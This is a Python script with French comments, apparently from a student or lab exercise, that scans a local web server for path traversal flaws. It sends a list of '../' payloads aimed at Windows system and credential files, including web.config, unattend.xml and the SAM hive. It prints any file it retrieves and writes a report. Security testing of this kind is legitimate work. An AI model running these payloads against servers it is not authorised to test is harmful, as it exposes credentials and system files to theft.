# Script de détection de vulnérabilités Path Traversal
# Auteur : Lozano, Reze
# Description : Ce script teste les vulnérabilités de type "Path Traversal" sur un serveur web cible.

import requests
from datetime import datetime
import os 

# -------------------------- URL de base du serveur à tester
base_url = "http://localhost:8088/projets/"

# -------------------------- Dossier de destination pour les logs
dossier_log = r"C:\Users\Antony\Desktop\log"

# -------------------------- Liste des chemins potentiellement vulnérables windows à tester
paths = [
    "../../../../../../../../../../c:/boot.ini",
    "../../../../../../../../../../c:/inetpub/logs/logfiles",
    "../../../../../../../../../../c:/inetpub/wwwroot/global.asa",
    "../../../../../../../../../../c:/inetpub/wwwroot/index.asp",
    "../../../../../../../../../../c:/inetpub/wwwroot/web.config",
    "../../../../../../../../../../c:/sysprep.inf",
    "../../../../../../../../../../c:/sysprep.xml",
    "../../../../../../../../../../c:/sysprep/sysprep.inf",
    "../../../../../../../../../../c:/sysprep/sysprep.xml",
    "../../../../../../../../../../c:/system32/inetsrv/metabase.xml",
    "../../../../../../../../../../c:/system volume information/wpsettings.dat",
    "../../../../../../../../../../c:/unattend.txt",
    "../../../../../../../../../../c:/unattend.xml",
    "../../../../../../../../../../c:/unattended.txt",
    "../../../../../../../../../../c:/unattended.xml",
    "../../../../../../../../../../c:/windows/repair/sam",
    "../../../../../../../../../../c:/windows/repair/system"
]

# -------------------------- Générer des rapports  
rapport = []

# -------------------------- Parcourir chaque chemin dans la liste pour tester les vulnérabilités
for path in paths:
    url = base_url + path

    # -------------------------- Effectuer une requête HTTP GET vers l'URL construite
    try:
        reponse = requests.get(url)

        # -------------------------- Analyser la réponse HTTP pour vérifier la vulnérabilité
        if reponse.status_code == 200:
            # -------------------------- Si le code de statut est 200, il peut y avoir une vulnérabilité
            print(f"[+] Vulnérabilité détectée à l'URL : {url}")
            print(f"Contenu du fichier :\n{reponse.text}")
            rapport.append(f"- Vulnérabilité détectée à l'URL : {url}")
        elif reponse.status_code == 403 or reponse.status_code == 404:
            # -------------------------- Si le code de statut est 403 ou 404, l'URL semble sécurisée
            print(f"[-] URL sécurisée : {url} (Code {reponse.status_code})")
        else:
            # -------------------------- Pour les autres codes de statut, noter un statut inattendu
            print(f"[!] Statut inattendu : {url} (Code {reponse.status_code})")
            rapport.append(f"- Statut inattendu à l'URL : {url} (Code {reponse.status_code})")
    except requests.RequestException as erreur_requete:
        # -------------------------- Gestion des erreurs de connexion ou autres exceptions de requêtes
        print(f"[!] Erreur lors de la connexion à {url} : {erreur_requete}")
        rapport.append(f"- Erreur lors de la connexion à {url} : {erreur_requete}")

# -------------------------- Générer le rapport de vulnérabilités avec la date et l'heure actuelles
now = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
nom_fichier = f"rapport_path_traversal_lozano_reze_{now}.md"

# -------------------------- Chemin complet pour le fichier dans le dossier log
chemin_fichier = os.path.join(dossier_log, nom_fichier)

# -------------------------- Écrire les résultats dans un fichier de rapport
with open(chemin_fichier, "w") as fichier:
    fichier.write("# Rapport de détection de vulnérabilités Path Traversal\n\n")
    fichier.write("Ce rapport a été généré le : " + now + "\n\n")
    if rapport:
        fichier.write("## Vulnérabilités détectées :\n\n")
        for entree in rapport:
            fichier.write(f"{entree}\n")
    else:
        fichier.write("Aucune vulnérabilité détectée.")

print("\nLe rapport a été généré avec succès dans le fichier :", chemin_fichier)
